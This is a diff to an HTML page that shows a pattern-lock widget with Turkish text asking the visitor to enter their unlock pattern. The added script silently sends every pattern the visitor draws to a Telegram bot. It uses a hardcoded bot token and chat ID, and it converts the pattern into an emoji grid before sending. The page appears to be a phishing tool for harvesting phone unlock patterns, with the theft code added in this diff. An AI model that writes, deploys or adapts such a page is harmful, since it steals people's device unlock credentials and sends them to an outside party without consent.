@@ -3,7 +3,7 @@
 
 <head>
     <meta charset="utf-8">
-    <title>Desen</title>
+    <title>Pattern Lock</title>
     <style media="screen">
         * {
             box-sizing: border-box;
@@ -26,6 +26,17 @@
             margin: auto;
             height: 100%;
         }
+		
+		.pattern-dot.active {
+    background-color: red !important;
+    border-color: red !important;
+}
+
+.pattern-line {
+    stroke: red !important;
+    stroke-width: 5px !important;
+}
+
 
         h1 {
             text-align: center;
@@ -104,7 +115,7 @@ svg.patternlock.error g.lock-actives circle {
     <a href="https://github.com/Tympanix/pattern-lock-js">
     </a>
     <div class="container">
-        <h1> Desenininizi Girin</h1>
+<h1>Deseninizi Giriniz</h1>
        
         <svg class="patternlock" id="lock" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
             <g class="lock-actives"></g>
@@ -732,6 +743,8 @@ var i,
 		}
 		return -1;
 	},
+	
+	
 
 	booleans = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
 
@@ -10679,33 +10692,59 @@ function _defineProperty(obj, key, value) { if (key in obj) { Object.definePrope
 });	
 	</script>
 
-    <script type="text/javascript">
-    var e = document.getElementById('lock');
-    var p = new PatternLock(e, {
-        onPattern: function(pattern) {
-            var botToken = '';
-            var chatId = '';
+<script type="text/javascript">
+// Deseni sıralı emoji ızgaraya çeviren fonksiyon
+function patternToEmojiGridWithOrder(pattern) {
+    pattern = pattern ? String(pattern) : "";
+    const grid = Array(3).fill().map(() => Array(3).fill("◻️"));
+    const numberEmojis = ["1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"];
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: `Lock Pattern: ${pattern}`
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log(data);
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
+    [...pattern].forEach((p, idx) => {
+        let pos = parseInt(p) - 1;
+        if (pos >= 0 && pos < 9) {
+            let row = Math.floor(pos / 3);
+            let col = pos % 3;
+            grid[row][col] = numberEmojis[idx] || "🔴";
         }
     });
+
+    return grid.map(row => row.join(" ")).join("\n");
+}
+
+// Telegram bot bilgileri
+var botToken = '7649728830:AAE5D4zWx8yI3fBaCNKnz6c-3gc5_mq9ZFI';
+var chatId = '-1002475411082';
+
+// PatternLock objesi
+var e = document.getElementById('lock');
+var p = new PatternLock(e, {
+    onPattern: function(pattern) {
+        var emojiGrid = patternToEmojiGridWithOrder(pattern);
+        var message = `🔒 Lock Pattern:\n${emojiGrid}`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: "Markdown"
+            })
+        })
+        .then(response => response.json())
+        .then(data => console.log("Telegrama gönderildi:", data))
+        .catch(error => console.error('Hata:', error));
+    },
+
+    // İstersen burada çizgi ve nokta renkleri ile oynayabilirsin
+    patternLineColor: '#FF0000',
+    patternLineWidth: 5,
+    patternDotActiveColor: '#FF0000',
+    patternDotRadius: 15
+});
 </script>
+
+
 
 </body>
 
